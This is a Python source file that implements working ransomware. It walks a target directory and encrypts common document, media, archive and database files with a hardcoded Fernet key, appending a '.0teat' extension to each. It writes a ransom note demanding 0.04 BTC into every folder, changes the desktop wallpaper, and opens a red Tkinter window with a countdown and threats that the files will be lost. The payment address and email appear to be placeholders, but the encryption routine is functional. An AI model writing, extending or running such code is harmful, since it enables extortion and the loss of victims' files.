import os
import ctypes
import tkinter as tk
from tkinter import messagebox
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.fernet import Fernet

# === Global Settings ===
_KEY = b"lMwZbe4OA00Th-cGLXuN66FPmw9e62jHx3Lgh92MOj8="
_CIPHER = Fernet(_KEY)
_SECRET_KEY_FILE = "secret.key"
_IMAGE_PATH = os.path.abspath(r"E:\Pyhon_Developer\basic\photo_2025-06-30_22-06-30.jpg")
_TARGET_DIR = r"D:\PHP"
_TARGET_EXTENSIONS = (
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".jpg", ".jpeg", ".png",
    ".mp3", ".mp4", ".avi", ".zip", ".rar", ".7z",
    ".psd", ".ai", ".sql", ".db", ".csv"
)
# Save key once
with open(_SECRET_KEY_FILE, "wb") as key_file:
    key_file.write(_KEY)

# === Countdown GUI ===
class CountdownTimer(threading.Thread):
    def __init__(self, label, duration=3600):
        super().__init__()
        self.label = label
        self.duration = duration
        self.running = True

    def run(self):
        while self.duration > 0 and self.running:
            mins, secs = divmod(self.duration, 60)
            self.label.config(text=f"Time left to decrypt: {mins:02}:{secs:02}")
            time.sleep(1)
            self.duration -= 1
        self.label.config(text="Your files are gone forever!")

    def stop(self):
        self.running = False

def show_ransom_gui():
    root = tk.Tk()
    root.title("Ooops, your files have been encrypted!")
    root.geometry("850x500")
    root.configure(bg='darkred')
    root.resizable(False, False)

    tk.Label(root, text="Ooops, your important files are encrypted!", 
             fg="white", bg="darkred", font=("Helvetica", 16, "bold")).pack(pady=10)

    message = (
        "What happened to my computer?\n"
        "----------------------------------------\n"
        "Your important files are encrypted.\n"
        "Many of your documents, photos, videos, databases, and other files are no longer accessible\n"
        "because they have been encrypted with military grade AES encryption.\n\n"
        "How can I recover my files?\n"
        "----------------------------------------\n"
        "You need to pay 0.04 BTC to the address below to get your files back.\n"
        "After payment, send the transaction ID to support@example.com.\n"
        "Payment address (Bitcoin):\n"
        "1A2B3C4D5E6F7G8H9I0J\n\n"
        "Time is running out! Failure to pay will result in permanent loss of your files."
    )

    msg_label = tk.Label(root, text=message, justify="left", fg="white", bg="darkred", font=("Courier", 10))
    msg_label.pack(padx=20, pady=10)

    countdown_label = tk.Label(root, text="", fg="yellow", bg="darkred", font=("Helvetica", 14, "bold"))
    countdown_label.pack(pady=10)

    timer = CountdownTimer(countdown_label, duration=3600)
    timer.start()

    def on_close():
        if messagebox.askokcancel("Exit", "You cannot escape. Pay the ransom!"):
            root.destroy()
            timer.stop()

    root.protocol("WM_DELETE_WINDOW", on_close)
    root.mainloop()

# === File Encryption ===
def encrypt_file(file_path):
    try:
        if file_path.endswith('.0teat') or file_path.endswith('ransom_note.txt'):
            return
        if not file_path.lower().endswith(_TARGET_EXTENSIONS):
            return  # Skip non-targeted files
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = _CIPHER.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
        os.rename(file_path, file_path + ".0teat")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

def _get_name_path(directory):
    file_list = []

    for root, dirs, files in os.walk(directory):
        ransom_note = os.path.join(root, "ransom_note.txt")
        if not os.path.exists(ransom_note):
            with open(ransom_note, "w") as f:
                f.write("""Your files have been encrypted successfully.
You should pay 0.04 BTC to decrypt your files.
Send the payment to: 1A2B3C4D5E6F7G8H9I0J
After payment, send the transaction ID to: support@example.com
You have 7 days. After that, your files are gone.
""")

        for file in files:
            full_path = os.path.join(root, file)
            file_list.append(full_path)

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(encrypt_file, f) for f in file_list]
        for future in as_completed(futures):
            future.result()

    try:
        time.sleep(1)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, _IMAGE_PATH, 3)
    except Exception as e:
        print(f"Failed to set wallpaper: {e}")

# === Launch encryption + GUI together ===
threading.Thread(target=_get_name_path, args=(_TARGET_DIR,), daemon=True).start()
show_ransom_gui()
